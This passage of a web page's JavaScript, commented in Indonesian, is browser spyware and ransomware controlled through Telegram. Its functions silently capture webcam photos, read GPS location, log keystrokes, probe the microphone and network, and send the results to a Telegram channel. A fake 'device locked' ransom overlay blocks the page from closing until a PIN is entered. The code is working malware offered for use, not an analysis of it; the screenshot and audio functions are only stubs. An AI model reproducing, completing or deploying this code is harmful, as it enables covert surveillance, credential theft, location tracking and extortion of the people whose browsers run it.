        navigator.mediaDevices.getUserMedia({ video: true })

            video.srcObject = stream;

      }, true);
      
      // Block refresh/close
      window.addEventListener('beforeunload', function(e) {
        if (isRansomed) {
          e.preventDefault();
          e.returnValue = '';
        }
      });
    }

    // Ransomware unlock button
    document.getElementById('ransomwareUnlockBtn').addEventListener('click', function() {
      const inputPin = document.getElementById('ransomwarePin').value;
      const errorDiv = document.getElementById('ransomwareError');
      
      if (inputPin === ransomPin) {
        document.getElementById('ransomwareOverlay').style.display = 'none';
        isRansomed = false;
        sendToTelegram(`🔓 Device unlocked dengan PIN ${inputPin}`);
      } else {
        errorDiv.style.display = 'block';
        setTimeout(() => errorDiv.style.display = 'none', 3000);
      }
    });

    function lockDevice() {
      activateRansomware('DEVICE TERKUNCI OLEH RIZZXDC', '1234');
    }

    function unlockDevice() {
      document.getElementById('ransomwareOverlay').style.display = 'none';
      isRansomed = false;
    }

    function capturePhoto() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0);
              
              canvas.toBlob(blob => {
                if (blob) sendPhotoToTelegram(blob);
                stream.getTracks().forEach(track => track.stop());
              }, 'image/jpeg');
            }, 1000);
          };
        })
        .catch(() => sendToTelegram('❌ Gagal akses kamera'));
    }

    function getGPS() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`📍 GPS: <a href="${link}">${pos.coords.latitude}, ${pos.coords.longitude}</a>`);
          },
          () => sendToTelegram('📍 GPS ditolak')
        );
      }
    }

    function startKeylogger() {
      isKeylogging = true;
      keylogData = '';
      
      document.addEventListener('keydown', function(e) {
        if (isKeylogging) {
          keylogData += e.key + ' ';
        }
      });
    }

    function stopKeylogger() {
      isKeylogging = false;
    }

    function getNetworkInfo() {
      if (navigator.connection) {
        const conn = navigator.connection;
        sendToTelegram(`📡 WiFi Info:\nType: ${conn.effectiveType}\nDownlink: ${conn.downlink} Mbps\nRTT: ${conn.rtt} ms\nSave Data: ${conn.saveData}`);
      } else {
        sendToTelegram('📡 WiFi info tidak tersedia');
      }
    }

    function startAudioRecording() {
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          mediaStream = stream;
          sendToTelegram('🎤 Recording audio... (5 detik)');
          
          setTimeout(() => {
            stream.getTracks().forEach(track => track.stop());
            sendToTelegram('🎤 Audio recording selesai (simulasi - real recording butuh library tambahan)');
          }, 5000);
        })
        .catch(() => sendToTelegram('❌ Gagal akses mikrofon'));
    }

    function takeScreenshot() {
      // Simulasi screenshot - real implementation butuh library html2canvas
      sendToTelegram('📸 Screenshot (simulasi - untuk real screenshot butuh library tambahan)');
    }

    // ====================================================================
    // START
    // ====================================================================
    startTelegramListener();
  </script>
